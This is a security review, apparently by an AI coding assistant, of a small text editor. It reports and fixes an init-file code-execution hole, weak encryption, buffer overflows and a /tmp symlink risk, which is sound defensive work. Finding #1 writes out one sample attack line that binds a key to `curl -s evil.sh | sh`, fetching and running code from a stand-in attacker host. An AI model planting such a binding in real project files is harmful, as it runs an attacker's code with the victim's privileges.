# Security Review — ME editor (v2.14)

Reviewer: Claude Code · Date: 2026-07-07 · Scope: full source tree (compiled set per Makefile)

Threat model for a personal single-user editor: (a) opening untrusted files/directories,
(b) strength of the encryption the user relies on, (c) local temp-file hygiene on shared systems.
Not in scope: network attackers (there is no network surface).

Findings are ranked by real-world impact. Line numbers are against the live sources
(`file.c`, `main.c`, `init.c`, `crypt_buf.c`, `display.c`, `random.c`); `f1.c` and `ofile.c`
are stale duplicates not in the build.

---

## 1. CRITICAL — Arbitrary code execution via `./.me/init` in an untrusted directory
**STATUS: FIXED (2026-07-07)** — `edinit()` no longer auto-reads `./.me/init`; project-local
init is loadable only via explicit `-i <path>`. Verified end-to-end with `tests/pty_drive.py`:
a hostile `./.me/init` rebinding `C-n` to a shell command does nothing on default startup and
only runs under `me -i .me`.


`edinit()` reads `./.me/init` from the current working directory at startup, gated only by an
inode check that it differs from `~/.me` (main.c:1295-1303). The init parser (init.c:564-641)
honors `bind KEY | shell-cmd` and `def name | shell-cmd`, which bind a **keystroke** to a shell
command run via `/bin/sh -c` (do_pipe, init.c:265-313).

Nothing restricts which key may be rebound — including common navigation or self-inserting keys.
The only guard is a status-line *warning* when a binding shadows a built-in (init.c:600-610); it
does not block the bind and is trivially missed.

**Attack:** ship a repo/tarball containing `.me/init` with e.g. `bind C-n | curl -s evil.sh | sh`.
The victim runs `me somefile` inside that directory and the next time they press `C-n` (or whatever
common key was hijacked) the attacker's command executes with the victim's privileges. No prompt,
no opt-in. This is the vim-modeline / emacs local-variables class of bug.

**Fix:** do not read `./.me/init` by default. Options, in order of preference:
- Drop CWD init entirely; require `-i <path>` for project-local config.
- Or require the CWD init file to be owned by the user and not world/group-writable, AND prompt
  once per directory before trusting it (persist trust decisions in `~/.me`).
- Independently, refuse `| shell` bindings from any non-`~/.me` init source, and never silently
  rebind built-in keys.

---

## 2 & 3. HIGH — FIXED (2026-07-07): new #ME2.00$ encrypted-file format
Both findings below were resolved together by a new on-disk format written by `encrypt_buf`:
- **AES-256-GCM** (AEAD) — the authentication tag replaces the plaintext MD5 (fixes #2) and also
  authenticates the header (magic|salt|nonce) as AAD, so tampering fails decryption.
- **scrypt** KDF (N=16384, r=8, p=1) with a **per-file 16-byte random salt** (fixes #3): offline
  brute-force is now memory-hard, and identical passwords no longer yield identical keys.
- **New magic `#ME2.00$`**; legacy `#ME1.42$` files remain readable via a retained decrypt-only path
  (`decrypt_legacy`). Writing always emits `#ME2.00$`, so files upgrade on save.
- Requires OpenSSL (`-lcrypto`, added to the Makefile).

Verified end-to-end with `tests/test_crypt.py` (10/10): real legacy fixture still decrypts on the new
binary; new format round-trips; legacy files upgrade on save; wrong password is rejected by the GCM
tag; identical plaintext+password produce different salt and different ciphertext each time.

Also fixed in passing (**data-loss bug** surfaced during this work): `encryptb` (random.c) copied a new
password over the old one without NUL-terminating, so changing to a shorter password inherited residual
bytes from the previous one and encrypted the file under a password the user never typed — locking them
out. Now NUL-terminated.

---

## 2. HIGH — Plaintext MD5 stored in cleartext leaks/confirms file contents  [FIXED — see above]

The encrypted file header stores, unencrypted at bytes 8–24, the MD5 of the **plaintext**
(crypt_buf.c:65-68, format diagram at :26-35). Anyone who obtains the file, without the password:
- can confirm a guessed plaintext by computing its MD5 and comparing (a verification oracle —
  devastating for short or low-entropy content), and
- can tell whether two encrypted files have identical plaintext.

This defeats confidentiality for guessable content and is an information leak in all cases.

**Fix:** authenticate with a *keyed* MAC over the ciphertext (encrypt-then-MAC, e.g. HMAC with a
subkey derived from the password+salt), not an unkeyed hash of the plaintext. Store the MAC, not
the plaintext digest.

## 3. HIGH — Weak key derivation: raw password as Blowfish key, no salt, no stretching  [FIXED — see above]

The password is fed straight into `Blowfish_ExpandUserKey` once (crypt_buf.c:91, 146). There is no
salt and no iteration count. Consequences:
- Offline dictionary/brute-force is cheap (a single key schedule per guess).
- No salt ⇒ identical passwords produce identical keys across files; only the random IV differs.

Combined with finding #2, password strength is the *only* protection and it is inexpensive to attack.

**Fix:** derive the key with a real password KDF (argon2id / scrypt / PBKDF2) using a per-file random
salt. The header already has an unused 8-byte "flags" block (crypt_buf.c:71-72) — spend it (and more)
on salt + KDF parameters.

## 3b. Related crypto notes (MEDIUM/INFO)
- No cryptographic integrity over the IV/header; a bit-flipping attacker can tamper. The plaintext-MD5
  check catches random corruption but is unkeyed and not an authentication guarantee. Fixed by #2.
- No zeroization of password or plaintext buffers (the code comment at file.c:887-888 admits this);
  secrets linger in freed heap. Low impact for a local editor, but note it in the threat model.
- The header comment says "blowfish ecb mode" (crypt_buf.c:22) but the implementation is CBC.
  Cosmetic, but misleading for future maintainers.

---

## 4. MEDIUM — Unbounded copy in keyboard-macro replay (stack/global overflow)  [FIXED 2026-07-07]
Fixed in `mlreply1` (display.c): the macro-replay branch now guards every store with `cpos < nbuf-1`
(matching the interactive branch) while still consuming the full token so playback stays in sync.


`mlreply1()` bounds interactive input against `nbuf` (display.c:864), but the macro-replay branch
copies bytes from `kbdmop` into the caller's buffer with **no bound** (display.c:779-786):

```c
while ((c = *kbdmop++) != '\0') buf[cpos++] = c;
```

Callers pass fixed buffers (`fname[NFILEN]`, `pwbuf[MAXPW]`, `bname[NBUFN]`, …). A crafted macro
file — `~/.me/kbm_file`, `~/.me/macros/*`, or a `./.me/macros/*` planted alongside finding #1 via
the `macro` init directive (init.c:623-628) — overflows the buffer → memory corruption / control-flow
hijack. Note NFILEN is only 80 and NBUFN only 16 (ed.h:4-5), so overrun is easy.

**Fix:** bound the macro-replay copy by `nbuf-1` exactly like the interactive path, and truncate/abort
on overflow.

## 5. MEDIUM — Stack overflow building emergency-save filename  [FIXED 2026-07-07]
Fixed in `sig_handler` (main.c): `snprintf` into a `NFILEN*2` buffer, and `dirname()`/`basename()`
each get their own NUL-terminated copy (the original aliased one buffer through both, which each may
mutate). Note: the emergency-save handler still calls non-async-signal-safe functions — a separate,
pre-existing design issue left as-is.


In the panic/save-all path (main.c:598-607):

```c
BYTE fname[80]; BYTE s[80];
strncpy(s, curbp->fname, 80);                 // may leave s unterminated
sprintf(fname, "%s/~~%s", dirname(s), basename(s));
```

`curbp->fname` is NFILEN (80) bytes. `dirname()+"/~~"+basename()` reconstructs roughly the original
path length **plus 3 bytes** into an 80-byte buffer, so a file whose path is near the length limit
overflows `fname`. Also `strncpy(s, …, 80)` can leave `s` non-NUL-terminated, so `dirname`/`basename`
may read past it.

**Fix:** size the target buffer to `NFILEN + 4` (or use `snprintf`), and NUL-terminate `s`.

---

## 6. LOW — Predictable /tmp log file opened without O_NOFOLLOW  [FIXED 2026-07-07]
Fixed in `logit`/`logchr`/`logint` (main.c): all three log opens now pass `O_NOFOLLOW`, so a symlink
pre-planted at the predictable `/tmp/log.me.<uid>` path is not followed. (Residual, accepted: an
attacker pre-creating a *regular* file there could still capture debug-log content when logging is
enabled — closing that fully would require a user-private log dir; out of scope for a debug feature.)


The debug log is `/tmp/log.me.<uid>` (predictable) opened `O_CREAT|O_APPEND|O_WRONLY` with no
`O_EXCL`/`O_NOFOLLOW` (main.c:1370-1371, 1383-1384, and logchr/logint). On a shared `/tmp` an
attacker can pre-plant a symlink so the victim's log writes land in an attacker-chosen,
victim-writable file. Only active when logging (`do_log`) is on — a debug flag — hence low severity.

**Fix:** add `O_NOFOLLOW` (and prefer a per-user private dir, e.g. `~/.me/log`, or `O_EXCL` with a
fresh name). `sprintf` into `log_path[64]` is safe here (bounded content) but `snprintf` is tidier.

## 7. INFO — Housekeeping that affects attack surface
- `f1.c`, `ofile.c`, `file.c.good` are stale duplicates of the file/crypto logic, not in the Makefile.
  They contain older variants of the same routines and are confusing/dangerous if ever re-linked.
  Move to `old/` or delete.  **[DONE 2026-07-07 — removed via `git rm`.]**
  Note: `oldsearch.c` and `ran_vect.c` were also unreferenced dead code (not in the build, not
  included anywhere); removed 2026-07-08.
- `decrypt_buf` trusts its caller for length sanity. It's currently safe only because the call site
  guards `fz >= 48` (file.c:469) and `slurpfile` over-allocates by 128 bytes (file.c:95). If either
  invariant changes, a malformed encrypted file could underflow (`nb[nbx-1]` at crypt_buf.c:155) or
  read past the buffer on a non-multiple-of-8 body. Add explicit `*bz >= 48 && (*bz-40)%8==0` checks
  inside `decrypt_buf` so it is safe independent of callers.

---

## Suggested remediation order
1. Finding #1 (code execution) — highest impact, straightforward to fix.
2. Findings #2 + #3 together — redesign the encrypted-file header: random salt + KDF + encrypt-then-MAC.
   This is a format change; keep read-compat for legacy `#ME1.42$` files but write the new format.
3. Findings #4 and #5 (memory safety) — small, localized bounds fixes.
4. Findings #6, #7 — hardening / cleanup.
